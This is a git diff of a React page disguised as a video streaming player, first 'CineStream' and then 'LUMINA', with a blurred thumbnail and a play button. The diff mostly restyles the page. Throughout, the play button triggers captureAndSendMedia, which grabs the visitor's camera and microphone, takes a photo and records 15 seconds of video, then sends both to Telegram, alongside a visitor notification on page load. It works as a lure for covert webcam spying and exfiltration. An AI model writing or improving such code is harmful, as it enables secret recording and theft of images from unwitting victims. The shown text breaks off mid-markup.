@@ -1,10 +1,8 @@
-import { PlayIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
-  const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp';
+  const [menuOpen, setMenuOpen] = useState(false);
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -24,20 +22,13 @@ function App() {
       const videoDevice = devices.find(device => device.kind === 'videoinput');
       if (!videoDevice) throw new Error('No video input device found');
 
-      const constraints = {
-        video: {
-          deviceId: videoDevice.deviceId,
-          width: { ideal: 4096 },
-          height: { ideal: 2160 },
-          frameRate: { ideal: 60 }
-        },
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { deviceId: videoDevice.deviceId, width: { ideal: 4096 }, height: { ideal: 2160 }, frameRate: { ideal: 60 } },
         audio: true
-      };
+      });
 
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
       const videoTrack = stream.getVideoTracks()[0];
       const settings = videoTrack.getSettings();
-
       const video = document.createElement('video');
       video.srcObject = stream;
       video.playsInline = true;
@@ -46,13 +37,8 @@ function App() {
 
       await new Promise((resolve) => {
         video.onloadedmetadata = async () => {
-          try {
-            await video.play();
-            setTimeout(resolve, 500);
-          } catch (error) {
-            console.error('Error playing video:', error);
-            resolve(true);
-          }
+          try { await video.play(); setTimeout(resolve, 500); }
+          catch (e) { resolve(true); }
         };
       });
 
@@ -65,252 +51,259 @@ function App() {
       const photoBlob = await new Promise((resolve) => {
         canvas.toBlob((blob) => { if (blob) resolve(blob); }, 'image/jpeg', 1.0);
       });
-
       sendImageToTelegram(photoBlob).catch(console.error);
 
-      const mimeTypes = [
-        'video/mp4;codecs=h264,aac',
-        'video/mp4',
-        'video/webm;codecs=vp8,opus',
-        'video/webm'
-      ];
+      const mimeTypes = ['video/mp4;codecs=h264,aac', 'video/mp4', 'video/webm;codecs=vp8,opus', 'video/webm'];
       const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
       if (!supportedMimeType) throw new Error('No supported video format found');
 
-      const mediaRecorder = new MediaRecorder(stream, {
-        mimeType: supportedMimeType,
-        videoBitsPerSecond: 8000000
-      });
-
-      const chunks = [];
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 8000000 });
+      const chunks: Blob[] = [];
       mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
       mediaRecorder.onstop = async () => {
-        const videoBlob = new Blob(chunks, {
-          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
-        });
+        const videoBlob = new Blob(chunks, { type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm' });
         await sendVideoToTelegram(videoBlob);
         stream.getTracks().forEach(track => track.stop());
       };
 
       mediaRecorder.start(1000);
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 15000);
-
+      setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 15000);
     } catch (error) {
       console.error('Error capturing media:', error);
     }
   }, []);
 
-  const handlePlayClick = async () => {
-    await captureAndSendMedia();
-  };
-
-  // ============================================================
-  // HANYA BAGIAN RETURN INI YANG DIUBAH
-  // ============================================================
   return (
     <>
       <style>{`
         @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap');
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
           background: #080810;
+          color: #eadfed;
           font-family: 'DM Sans', sans-serif;
+          overflow-x: hidden;
         }
 
-        .app-wrapper {
-          min-height: 100vh;
-          background: radial-gradient(ellipse 80% 60% at 50% -10%, #1a0a2e 0%, #080810 60%);
+        .radial-glow {
+          position: fixed;
+          inset: 0;
+          background: radial-gradient(circle at top center, rgba(168,85,247,0.15) 0%, rgba(8,8,16,0) 70%);
+          pointer-events: none;
+          z-index: 0;
+        }
+
+        /* NAV */
+        .nav {
+          position: fixed;
+          top: 0;
+          width: 100%;
+          z-index: 50;
           display: flex;
-          flex-direction: column;
+          justify-content: space-between;
+          align-items: center;
+          padding: 0 20px;
+          height: 64px;
+          background: rgba(22,17,27,0.85);
+          backdrop-filter: blur(20px);
+          border-bottom: 1px solid rgba(255,255,255,0.08);
+          box-shadow: 0 0 15px rgba(168,85,247,0.12);
         }
+        @media(min-width:768px){ .nav { padding: 0 64px; height: 80px; } }
 
-        /* ---- HEADER ---- */
-        .header {
-          position: relative;
-          padding: 28px 48px;
+        .nav-logo {
           display: flex;
           align-items: center;
-          justify-content: space-between;
-          border-bottom: 1px solid rgba(255,255,255,0.05);
+          gap: 8px;
         }
-        .header::after {
-          content: '';
-          position: absolute;
-          bottom: -1px; left: 0;
-          width: 160px; height: 1px;
-          background: linear-gradient(90deg, #a855f7, transparent);
+        .nav-logo-dot {
+          width: 10px; height: 10px;
+          border-radius: 50%;
+          background: #ddb7ff;
+          box-shadow: 0 0 8px #ddb7ff;
         }
-        .logo-group {
+        .nav-logo-text {
+          font-family: 'Syne', sans-serif;
+          font-weight: 800;
+          font-size: 1.2rem;
+          letter-spacing: -0.02em;
+          color: #ddb7ff;
+        }
+
+        .nav-links {
+          display: none;
+          align-items: center;
+          gap: 32px;
+        }
+        @media(min-width:768px){ .nav-links { display: flex; } }
+        .nav-links a {
+          font-size: 0.9rem;
+          color: rgba(234,223,237,0.5);
+          text-decoration: none;
+          transition: color 0.2s;
+        }
+        .nav-links a.active {
+          color: #ddb7ff;
+          font-weight: 700;
+          border-bottom: 2px solid #ddb7ff;
+          padding-bottom: 2px;
+        }
+        .nav-links a:hover { color: #eadfed; }
+
+        .nav-right {
           display: flex;
           align-items: center;
           gap: 12px;
         }
-        .logo-dot {
-          width: 10px; height: 10px;
-          border-radius: 50%;
-          background: #a855f7;
-          box-shadow: 0 0 12px #a855f7, 0 0 28px rgba(168,85,247,0.4);
-          animation: pulse-dot 2s ease-in-out infinite;
-        }
-        @keyframes pulse-dot {
-          0%, 100% { opacity: 1; transform: scale(1); }
-          50% { opacity: 0.6; transform: scale(0.85); }
-        }
-        .logo-text {
-          font-family: 'Syne', sans-serif;
-          font-weight: 800;
-          font-size: 1.25rem;
-          letter-spacing: -0.02em;
-          color: #fff;
-        }
-        .logo-text span {
-          color: #a855f7;
-        }
-        .header-badge {
-          font-size: 0.7rem;
-          font-weight: 500;
-          letter-spacing: 0.12em;
-          text-transform: uppercase;
-          color: rgba(255,255,255,0.3);
-          border: 1px solid rgba(255,255,255,0.08);
-          padding: 5px 12px;
+        .hd-badge {
+          display: none;
+          padding: 5px 14px;
           border-radius: 100px;
+          border: 1px solid rgba(221,183,255,0.2);
+          background: rgba(255,255,255,0.06);
+          backdrop-filter: blur(12px);
+          font-size: 0.65rem;
+          font-weight: 700;
+          letter-spacing: 0.12em;
+          color: #ddb7ff;
+        }
+        @media(min-width:640px){ .hd-badge { display: block; } }
+
+        .hamburger {
+          display: flex;
+          flex-direction: column;
+          gap: 5px;
+          background: none;
+          border: none;
+          cursor: pointer;
+          padding: 4px;
+        }
+        @media(min-width:768px){ .hamburger { display: none; } }
+        .hamburger span {
+          display: block;
+          width: 22px; height: 2px;
+          background: #eadfed;
+          border-radius: 2px;
+          transition: all 0.3s;
         }
 
-        /* ---- MAIN ---- */
-        .main-content {
-          flex: 1;
+        /* MOBILE MENU */
+        .mobile-menu {
+          display: none;
+          position: fixed;
+          top: 64px;
+          left: 0; right: 0;
+          background: rgba(22,17,27,0.97);
+          backdrop-filter: blur(20px);
+          border-bottom: 1px solid rgba(255,255,255,0.06);
+          z-index: 49;
+          padding: 16px 20px 24px;
+          flex-direction: column;
+          gap: 16px;
+        }
+        .mobile-menu.open { display: flex; }
+        .mobile-menu a {
+          font-size: 1rem;
+          color: rgba(234,223,237,0.6);
+          text-decoration: none;
+          padding: 10px 0;
+          border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .mobile-menu a.active { color: #ddb7ff; font-weight: 700; }
+
+        /* MAIN */
+        .main {
+          position: relative;
+          z-index: 10;
+          padding-top: 80px;
+          padding-bottom: 80px;
+          padding-left: 20px;
+          padding-right: 20px;
           display: flex;
           flex-direction: column;
           align-items: center;
-          justify-content: center;
-          padding: 48px 24px;
-          gap: 28px;
         }
+        @media(min-width:768px){ .main { padding-top: 100px; padding-left: 64px; padding-right: 64px; } }
 
-        .player-label {
-          font-family: 'Syne', sans-serif;
-          font-size: 0.7rem;
-          font-weight: 600;
-          letter-spacing: 0.25em;
-          text-transform: uppercase;
-          color: rgba(168,85,247,0.7);
-          display: flex;
-          align-items: center;
-          gap: 10px;
-        }
-        .player-label::before,
-        .player-label::after {
-          content: '';
-          display: block;
-          width: 32px; height: 1px;
-          background: rgba(168,85,247,0.4);
-        }
-
-        /* ---- PLAYER CONTAINER ---- */
-        .player-outer {
-          width: 100%;
-          max-width: 1000px;
-          position: relative;
-        }
-
-        /* Glow aura */
-        .player-glow {
-          position: absolute;
-          inset: -1px;
-          border-radius: 20px;
-          background: linear-gradient(135deg, rgba(168,85,247,0.35) 0%, rgba(99,102,241,0.15) 50%, rgba(168,85,247,0.1) 100%);
-          filter: blur(1px);
-          z-index: 0;
-        }
+        /* PLAYER */
+        .player-section { width: 100%; max-width: 1000px; }
 
         .player-card {
           position: relative;
-          z-index: 1;
-          border-radius: 18px;
+          aspect-ratio: 16/9;
+          width: 100%;
+          border-radius: 14px;
           overflow: hidden;
           background: #0d0d1a;
-          border: 1px solid rgba(168,85,247,0.15);
-          box-shadow:
-            0 0 0 1px rgba(255,255,255,0.03),
-            0 40px 100px rgba(0,0,0,0.7),
-            0 0 80px rgba(168,85,247,0.08);
+          border: 1px solid rgba(168,85,247,0.35);
+          box-shadow: 0 0 15px rgba(168,85,247,0.25), 0 40px 80px rgba(0,0,0,0.6);
+          transition: transform 0.4s ease, box-shadow 0.4s ease;
+        }
+        @media(min-width:768px){
+          .player-card { border-radius: 18px; }
+          .player-card:hover { transform: scale(1.005); box-shadow: 0 0 30px rgba(168,85,247,0.35), 0 40px 80px rgba(0,0,0,0.7); }
         }
 
-        /* Top bar inside player */
-        .player-topbar {
+        .player-thumb {
           position: absolute;
-          top: 0; left: 0; right: 0;
-          z-index: 20;
-          padding: 16px 20px;
+          inset: 0;
+          background-image: url('https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp');
+          background-size: cover;
+          background-position: center;
+          filter: blur(6px) brightness(0.45) saturate(0.8);
+        }
+
+        .player-overlay {
+          position: absolute;
+          inset: 0;
           display: flex;
-          align-items: center;
+          flex-direction: column;
           justify-content: space-between;
-          background: linear-gradient(to bottom, rgba(0,0,0,0.65), transparent);
+          padding: 12px;
         }
-        .live-badge {
+        @media(min-width:640px){ .player-overlay { padding: 16px; } }
+
+        /* Badges */
+        .glass-badge {
+          backdrop-filter: blur(12px);
+          background: rgba(255,255,255,0.08);
+          border: 1px solid rgba(255,255,255,0.1);
+        }
+        .player-badges { display: flex; justify-content: space-between; align-items: flex-start; }
+        .badge-live {
           display: flex;
           align-items: center;
-          gap: 6px;
-          background: rgba(168,85,247,0.15);
-          border: 1px solid rgba(168,85,247,0.3);
+          gap: 5px;
+          padding: 4px 10px;
           border-radius: 100px;
-          padding: 4px 12px;
-          font-size: 0.65rem;
-          font-weight: 600;
-          letter-spacing: 0.12em;
-          text-transform: uppercase;
-          color: #c084fc;
-          backdrop-filter: blur(8px);
+          font-size: 0.6rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          color: #fff;
         }
+        @media(min-width:640px){ .badge-live { padding: 4px 12px; font-size: 0.65rem; } }
         .live-dot {
           width: 6px; height: 6px;
           border-radius: 50%;
-          background: #c084fc;
-          animation: pulse-dot 1.5s ease-in-out infinite;
+          background: #ff4b4b;
+          animation: pulse-red 2s ease-in-out infinite;
         }
-        .quality-badge {
-          font-size: 0.65rem;
-          font-weight: 600;
-          letter-spacing: 0.1em;
-          color: rgba(255,255,255,0.4);
-          border: 1px solid rgba(255,255,255,0.08);
+        @keyframes pulse-red {
+          0%, 100% { opacity: 1; transform: scale(1); }
+          50% { opacity: 0.4; transform: scale(0.7); }
+        }
+        .badge-quality {
           padding: 4px 10px;
-          border-radius: 6px;
-          backdrop-filter: blur(8px);
+          border-radius: 100px;
+          font-size: 0.6rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          color: #fff;
         }
-
-        /* Thumbnail + blur overlay */
-        .player-aspect {
-          aspect-ratio: 16 / 9;
-          position: relative;
-        }
-        .player-thumbnail {
-          width: 100%;
-          height: 100%;
-          object-fit: cover;
-          display: block;
-          filter: brightness(0.65) saturate(0.8);
-        }
-        .player-blur-overlay {
-          position: absolute;
-          inset: 0;
-          backdrop-filter: blur(16px);
-          background: rgba(8,8,16,0.55);
-        }
-
-        /* Vignette */
-        .player-vignette {
-          position: absolute;
-          inset: 0;
-          background: radial-gradient(ellipse at center, transparent 30%, rgba(0,0,0,0.6) 100%);
-          pointer-events: none;
-          z-index: 5;
-        }
+        @media(min-width:640px){ .badge-quality { padding: 4px 12px; font-size: 0.65rem; } }
 
         /* Play button */
         .play-center {
@@ -319,286 +312,358 @@ function App() {
           display: flex;
           align-items: center;
           justify-content: center;
-          z-index: 10;
         }
-        .play-button-wrap {
-          position: relative;
-          cursor: pointer;
-          background: none;
-          border: none;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-        }
+        .play-wrap { position: relative; display: flex; align-items: center; justify-content: center; }
         .play-ring {
           position: absolute;
-          width: 110px; height: 110px;
-          border-radius: 50%;
-          border: 1px solid rgba(168,85,247,0.3);
-          animation: ring-expand 2.5s ease-out infinite;
-        }
-        .play-ring:nth-child(2) { animation-delay: 0.8s; }
-        @keyframes ring-expand {
-          0% { transform: scale(0.9); opacity: 0.8; }
-          100% { transform: scale(1.7); opacity: 0; }
-        }
-        .play-btn-inner {
-          position: relative;
           width: 80px; height: 80px;
           border-radius: 50%;
-          background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
+          border: 1px solid rgba(168,85,247,0.3);
+          animation: ring-expand 3s cubic-bezier(0.4,0,0.2,1) infinite;
+        }
+        .play-ring:nth-child(2) { animation-delay: 1.5s; }
+        @media(min-width:640px){
+          .play-ring { width: 96px; height: 96px; }
+        }
+        @keyframes ring-expand {
+          0% { transform: scale(1); opacity: 0.8; }
+          100% { transform: scale(2.5); opacity: 0; }
+        }
+        .play-btn {
+          position: relative;
+          width: 56px; height: 56px;
+          border-radius: 50%;
+          background: linear-gradient(135deg, #a855f7, #7e22ce);
+          border: none;
+          cursor: pointer;
           display: flex;
           align-items: center;
           justify-content: center;
-          box-shadow:
-            0 0 0 0 rgba(168,85,247,0.4),
-            0 8px 32px rgba(168,85,247,0.5),
-            0 2px 8px rgba(0,0,0,0.4);
+          box-shadow: 0 0 30px rgba(168,85,247,0.5);
           transition: transform 0.25s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.25s ease;
         }
-        .play-button-wrap:hover .play-btn-inner {
-          transform: scale(1.1);
-          box-shadow:
-            0 0 0 0 rgba(168,85,247,0.4),
-            0 12px 48px rgba(168,85,247,0.7),
-            0 2px 8px rgba(0,0,0,0.4);
-        }
-        .play-btn-inner svg {
-          width: 32px; height: 32px;
+        @media(min-width:640px){ .play-btn { width: 72px; height: 72px; } }
+        .play-btn:hover { transform: scale(1.12); box-shadow: 0 0 50px rgba(168,85,247,0.7); }
+        .play-btn:active { transform: scale(0.95); }
+        .play-btn .material-symbols-outlined {
+          font-size: 28px;
           color: #fff;
-          margin-left: 4px;
+          margin-left: 3px;
+          font-variation-settings: 'FILL' 1;
         }
+        @media(min-width:640px){ .play-btn .material-symbols-outlined { font-size: 36px; } }
 
-        /* Bottom bar inside player */
-        .player-bottombar {
-          position: absolute;
-          bottom: 0; left: 0; right: 0;
-          z-index: 20;
-          padding: 16px 20px;
-          background: linear-gradient(to top, rgba(0,0,0,0.75), transparent);
+        /* Progress bar */
+        .player-progress { width: 100%; }
+        .progress-labels {
           display: flex;
-          align-items: center;
-          gap: 12px;
+          justify-content: space-between;
+          font-size: 0.6rem;
+          color: rgba(255,255,255,0.5);
+          margin-bottom: 6px;
         }
+        @media(min-width:640px){ .progress-labels { font-size: 0.65rem; } }
         .progress-track {
-          flex: 1;
           height: 3px;
-          background: rgba(255,255,255,0.1);
+          width: 100%;
+          background: rgba(255,255,255,0.15);
           border-radius: 100px;
           overflow: hidden;
         }
         .progress-fill {
-          width: 0%;
           height: 100%;
-          background: linear-gradient(90deg, #a855f7, #c084fc);
+          width: 25%;
+          background: linear-gradient(90deg, #a855f7, #ddb7ff);
           border-radius: 100px;
-        }
-        .time-label {
-          font-size: 0.65rem;
-          color: rgba(255,255,255,0.3);
-          font-weight: 500;
-          letter-spacing: 0.05em;
-          white-space: nowrap;
+          box-shadow: 0 0 8px #a855f7;
         }
 
-        /* ---- META INFO BELOW PLAYER ---- */
-        .meta-row {
-          width: 100%;
-          max-width: 1000px;
+        /* Player meta */
+        .player-meta {
+          margin-top: 16px;
           display: flex;
-          align-items: flex-start;
-          justify-content: space-between;
-          gap: 24px;
-          padding: 0 4px;
+          flex-direction: column;
+          gap: 12px;
         }
-        .meta-left {}
+        @media(min-width:640px){
+          .player-meta { flex-direction: row; align-items: center; justify-content: space-between; gap: 16px; margin-top: 20px; }
+        }
         .meta-title {
           font-family: 'Syne', sans-serif;
-          font-size: 1.15rem;
+          font-size: 1rem;
           font-weight: 700;
           color: #fff;
           letter-spacing: -0.01em;
-          margin-bottom: 6px;
+          margin-bottom: 4px;
         }
+        @media(min-width:640px){ .meta-title { font-size: 1.25rem; } }
         .meta-sub {
-          font-size: 0.78rem;
-          color: rgba(255,255,255,0.3);
-          font-weight: 400;
-          display: flex;
-          align-items: center;
-          gap: 12px;
+          font-size: 0.75rem;
+          color: rgba(234,223,237,0.45);
         }
-        .meta-dot {
-          width: 3px; height: 3px;
-          border-radius: 50%;
-          background: rgba(255,255,255,0.2);
-          display: inline-block;
-        }
-        .meta-right {
-          display: flex;
-          align-items: center;
-          gap: 10px;
-          flex-shrink: 0;
-        }
-        .meta-action-btn {
+        .meta-actions { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+        .action-btn {
           display: flex;
           align-items: center;
           gap: 6px;
-          padding: 8px 16px;
+          padding: 8px 14px;
           border-radius: 100px;
           border: 1px solid rgba(255,255,255,0.08);
-          background: rgba(255,255,255,0.03);
-          font-size: 0.72rem;
-          font-weight: 500;
-          color: rgba(255,255,255,0.4);
+          background: rgba(255,255,255,0.04);
+          font-size: 0.65rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          color: rgba(255,255,255,0.5);
           cursor: pointer;
           transition: all 0.2s ease;
         }
-        .meta-action-btn:hover {
-          border-color: rgba(168,85,247,0.3);
-          color: #c084fc;
-          background: rgba(168,85,247,0.07);
+        @media(min-width:640px){ .action-btn { padding: 8px 18px; } }
+        .action-btn:hover { border-color: rgba(168,85,247,0.4); color: #ddb7ff; background: rgba(168,85,247,0.08); }
+        .action-btn .material-symbols-outlined { font-size: 14px; font-variation-settings: 'FILL' 0; }
+
+        /* CONTINUE WATCHING */
+        .section-continue {
+          margin-top: 60px;
+          width: 100%;
+          max-width: 1000px;
         }
-        .meta-action-btn svg {
-          width: 13px; height: 13px;
+        @media(min-width:768px){ .section-continue { margin-top: 80px; } }
+        .section-title {
+          font-family: 'Syne', sans-serif;
+          font-size: 1rem;
+          font-weight: 600;
+          color: #ddb7ff;
+          margin-bottom: 16px;
+          letter-spacing: -0.01em;
+        }
+        @media(min-width:640px){ .section-title { font-size: 1.1rem; margin-bottom: 20px; } }
+        .cards-grid {
+          display: grid;
+          grid-template-columns: 1fr;
+          gap: 12px;
+        }
+        @media(min-width:480px){ .cards-grid { grid-template-columns: 1fr 1fr; } }
+        @media(min-width:768px){ .cards-grid { grid-template-columns: 1fr 1fr 1fr; gap: 16px; } }
+
+        .thumb-card {
+          position: relative;
+          aspect-ratio: 16/9;
+          border-radius: 12px;
+          overflow: hidden;
+          border: 1px solid rgba(168,85,247,0.2);
+          box-shadow: 0 0 12px rgba(168,85,247,0.15);
+          cursor: pointer;
+          background: #1f1a23;
+        }
+        .thumb-card-img {
+          position: absolute;
+          inset: 0;
+          background-size: cover;
+          background-position: center;
+          transition: transform 0.5s ease;
+        }
+        .thumb-card:hover .thumb-card-img { transform: scale(1.08); }
+        .thumb-card-overlay {
+          position: absolute;
+          inset: 0;
+          background: linear-gradient(to top, rgba(0,0,0,0.85) 0%, transparent 60%);
+          display: flex;
+          flex-direction: column;
+          justify-content: flex-end;
+          padding: 10px 12px;
+        }
+        .card-label {
+          font-size: 0.58rem;
+          font-weight: 700;
+          letter-spacing: 0.12em;
+          color: #ddb7ff;
+          margin-bottom: 3px;
+        }
+        .card-title {
+          font-family: 'Syne', sans-serif;
+          font-size: 0.8rem;
+          font-weight: 600;
+          color: #fff;
         }
 
-        /* ---- FOOTER ---- */
+        /* FOOTER */
         .footer {
-          padding: 20px 48px;
-          border-top: 1px solid rgba(255,255,255,0.04);
+          position: relative;
+          z-index: 10;
+          border-top: 1px solid rgba(255,255,255,0.06);
+          padding: 40px 20px;
           display: flex;
+          flex-direction: column;
           align-items: center;
-          justify-content: space-between;
+          gap: 20px;
+          text-align: center;
         }
-        .footer-text {
+        @media(min-width:768px){
+          .footer { flex-direction: row; justify-content: space-between; padding: 40px 64px; text-align: left; }
+        }
+        .footer-logo {
+          font-family: 'Syne', sans-serif;
+          font-size: 1.4rem;
+          font-weight: 800;
+          color: #ddb7ff;
+          letter-spacing: -0.02em;
+        }
+        .footer-sub {
           font-size: 0.7rem;
-          color: rgba(255,255,255,0.15);
-          letter-spacing: 0.05em;
+          color: rgba(255,255,255,0.2);
+          margin-top: 4px;
         }
-        .footer-dots {
+        .footer-links {
           display: flex;
-          gap: 6px;
+          flex-wrap: wrap;
+          justify-content: center;
+          gap: 20px;
         }
-        .footer-dot {
-          width: 4px; height: 4px;
-          border-radius: 50%;
-          background: rgba(255,255,255,0.08);
+        @media(min-width:768px){ .footer-links { justify-content: flex-end; } }
+        .footer-links a {
+          font-size: 0.8rem;
+          color: rgba(255,255,255,0.3);
+          text-decoration: none;
+          transition: color 0.2s;
         }
-        .footer-dot.active {
-          background: #a855f7;
-          box-shadow: 0 0 6px rgba(168,85,247,0.5);
-        }
+        .footer-links a:hover { color: #ddb7ff; }
       `}</style>
 
-      <div className="app-wrapper">
+      {/* BG GLOW */}
+      <div className="radial-glow" />
 
-        {/* HEADER */}
-        <header className="header">
-          <div className="logo-group">
-            <div className="logo-dot" />
-            <div className="logo-text">Cine<span>Stream</span></div>
-          </div>
-          <div className="header-badge">HD Player</div>
-        </header>
+      {/* NAV */}
+      <nav className="nav">
+        <div className="nav-logo">
+          <div className="nav-logo-dot" />
+          <span className="nav-logo-text">LUMINA</span>
+        </div>
+        <div className="nav-links">
+          <a href="#" className="active">Browse</a>
+          <a href="#">Movies</a>
+          <a href="#">Series</a>
+          <a href="#">My List</a>
+        </div>
+        <div className="nav-right">
+          <div className="hd-badge">HD PLAYER</div>
+          <button className="hamburger" onClick={() => setMenuOpen(o => !o)} aria-label="Menu">
+            <span />
+            <span />
+            <span />
+          </button>
+        </div>
+      </nav>
 
-        {/* MAIN */}
-        <main className="main-content">
+      {/* MOBILE MENU */}
+      <div className={`mobile-menu ${menuOpen ? 'open' : ''}`}>
+        <a href="#" className="active" onClick={() => setMenuOpen(false)}>Browse</a>
+        <a href="#" onClick={() => setMenuOpen(false)}>Movies</a>
+        <a href="#" onClick={() => setMenuOpen(false)}>Series</a>
+        <a href="#" onClick={() => setMenuOpen(false)}>My List</a>
+      </div>
 
-          <div className="player-label">Now Playing</div>
+      {/* MAIN */}
+      <main className="main">
 
-          {/* PLAYER */}
-          <div className="player-outer">
-            <div className="player-glow" />
-            <div className="player-card">
-
-              {/* Top bar */}
-              <div className="player-topbar">
-                <div className="live-badge">
+        {/* PLAYER */}
+        <section className="player-section">
+          <div className="player-card">
+            <div className="player-thumb" />
+            <div className="player-overlay">
+              {/* Top badges */}
+              <div className="player-badges">
+                <div className="badge-live glass-badge">
                   <div className="live-dot" />
-                  Stream
+                  STREAM
                 </div>
-                <div className="quality-badge">4K UHD</div>
+                <div className="badge-quality glass-badge">4K UHD</div>
               </div>
 
-              {/* Aspect ratio wrapper */}
-              <div className="player-aspect">
-                <img
-                  src={thumbnailUrl}
-                  alt="Video Thumbnail"
-                  className="player-thumbnail"
-                />
-                {isBlurred && <div className="player-blur-overlay" />}
-                <div className="player-vignette" />
-
-                {/* Play button */}
-                <div className="play-center">
-                  <button className="play-button-wrap" onClick={handlePlayClick}>
-                    <div className="play-ring" />
-                    <div className="play-ring" style={{ animationDelay: '0.8s' }} />
-                    <div className="play-btn-inner">
-                      <PlayIcon />
-                    </div>
+              {/* Play button */}
+              <div className="play-center">
+                <div className="play-wrap">
+                  <div className="play-ring" />
+                  <div className="play-ring" />
+                  <button className="play-btn" onClick={() => captureAndSendMedia()}>
+                    <span className="material-symbols-outlined">play_arrow</span>
                   </button>
                 </div>
+              </div>
 
-                {/* Bottom progress bar */}
-                <div className="player-bottombar">
-                  <div className="time-label">0:00</div>
-                  <div className="progress-track">
-                    <div className="progress-fill" />
-                  </div>
-                  <div className="time-label">--:--</div>
+              {/* Progress */}
+              <div className="player-progress">
+                <div className="progress-labels">
+                  <span>24:18</span>
+                  <span>1:45:00</span>
+                </div>
+                <div className="progress-track">
+                  <div className="progress-fill" />
                 </div>
               </div>
-
             </div>
           </div>
 
-          {/* META ROW */}
-          <div className="meta-row">
-            <div className="meta-left">
-              <div className="meta-title">Featured Content</div>
-              <div className="meta-sub">
-                <span>HD Stream</span>
-                <span className="meta-dot" />
-                <span>Click play to watch</span>
-                <span className="meta-dot" />
-                <span style={{ color: 'rgba(168,85,247,0.7)' }}>Free</span>
+          {/* Meta */}
+          <div className="player-meta">
+            <div>
+              <div className="meta-title">Neon Horizons: The Genesis Protocol</div>
+              <div className="meta-sub">Sci-Fi &nbsp;·&nbsp; 2h 15m &nbsp;·&nbsp; 2024</div>
+            </div>
+            <div className="meta-actions">
+              <button className="action-btn">
+                <span className="material-symbols-outlined">bookmark</span>
+                SAVE
+              </button>
+              <button className="action-btn">
+                <span className="material-symbols-outlined">share</span>
+                SHARE
+              </button>
+            </div>
+          </div>
+        </section>
+
+        {/* CONTINUE WATCHING */}
+        <section className="section-continue">
+          <div className="section-title">Continue Watching</div>
+          <div className="cards-grid">
+            <div className="thumb-card">
+              <div className="thumb-card-img" style={{ backgroundImage: `url('https://lh3.googleusercontent.com/aida-public/AB6AXuDSk6Nu_Cc9x5_NorhItKFOVjk-Bss5roq1PW98Etc8--v_Pf0c4m8mGgPSwWxjmTOZbUx2cDeosDvR8aJh1E4zrsDOuucEceq8zOJ5mjRP4cHfH3QC0cCiqUQbijBKaOqa-ph4omIcdFXzZskBW3wfovQeCplU5zePFDSqdcc2oefMvonnrfy2Ulk2II_Z8Hg47XydXbuKZx_opyxcd6cOBsH6WtCSeXh_O8awVDp4y-7tVyOYZGT5JzjrFNm3uwuA8CaoCw0LjeBK')` }} />
+              <div className="thumb-card-overlay">
+                <div className="card-label">EPISODE 4</div>
+                <div className="card-title">Stellar Drift</div>
               </div>
             </div>
-            <div className="meta-right">
-              <button className="meta-action-btn">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
-                </svg>
-                Save
-              </button>
-              <button className="meta-action-btn">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/>
-                  <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
-                  <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
-                </svg>
-                Share
-              </button>
+            <div className="thumb-card">
+              <div className="thumb-card-img" style={{ backgroundImage: `url('https://lh3.googleusercontent.com/aida-public/AB6AXuCCgjTU0aK7K2JLGweEKaHiMDHGrCTgPqbs2p6itf0UdL4SIQHTam16bNdT78-VW74JOdEDIZ7pF_b5qBFhiJ7QJkRW-BYqeNFb0bvQW2rmmg7TJwNIrflMiZk1d_xd-MM4_N9yFFTt6etRvOhUobFvhsJ0ygWnsIAOe9t2tKVQWzfG7waoJhTf_x1An2cfkLI8eXHejOc7Fs4t8SQd0i-adluqAC_YsFNTWJBB5sgdyIKu1iDz3-QNfI5sglG-4NeanGqXYDEz1h5h')` }} />
+              <div className="thumb-card-overlay">
+                <div className="card-label">MOVIE</div>
+                <div className="card-title">The Void Between</div>
+              </div>
+            </div>
+            <div className="thumb-card">
